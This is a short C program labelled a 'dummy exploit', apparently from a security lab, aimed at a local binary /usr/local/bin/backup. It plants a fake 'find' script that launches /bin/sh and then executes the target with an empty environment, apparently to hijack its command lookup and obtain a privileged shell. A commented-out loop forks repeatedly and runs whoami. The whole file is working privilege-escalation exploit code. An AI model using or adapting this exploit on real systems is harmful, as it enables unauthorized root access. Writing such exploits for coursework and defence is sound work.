/*                                                                                                       
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/backup" // or backupV2

int main(void)
{
  char *args[3];
  char *env[1];
  int i;

  system("echo /bin/sh > find");
  system("chmod 755 ./find");

  args[0] = TARGET; args[1] = "ls"; 
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  //for (i = 0; i < 150; i++) {
  //  if (fork()) {
  //    if (execve(TARGET, args, env) < 0)
  //      fprintf(stderr, "execve failed.\n");
  //      exit(0);
  //  } else {
  //    system("whoami");
  //  }
  //}
  exit(0);
}

